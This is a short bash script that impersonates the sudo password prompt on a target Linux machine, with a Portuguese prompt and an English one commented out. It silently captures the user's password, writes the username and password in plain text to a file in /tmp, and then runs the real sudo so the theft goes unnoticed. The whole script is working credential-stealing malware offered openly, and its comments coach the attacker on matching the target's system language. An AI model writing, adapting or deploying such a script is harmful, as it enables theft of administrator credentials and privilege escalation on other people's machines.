#!/bin/bash

function get_shell (){

	realPCsudo=$(which sudo)
	
	# PT-BR
	# if you dont know what the sys-language of the linux target machine, just run "echo $LANG" (remember to get rid off of the double-quotes)
	read -s -p "[sudo] senha para $USER: " user_sudo_password # if the target machine runs under an english environment, just comment this line, and uncomment the next line
	
	# English
	# read -s -p "[sudo] password for $USER: " user_sudo_password  #### and so on, according with the target's system language
	
	printf "\n" # new line
	printf '%s\n' "username: $USER | password: $user_sudo_password" > /tmp/content_extra_file # save to /tmp directory with a random name

	echo "$user_sudo_password" | sudo -S $@

}

get_shell $@
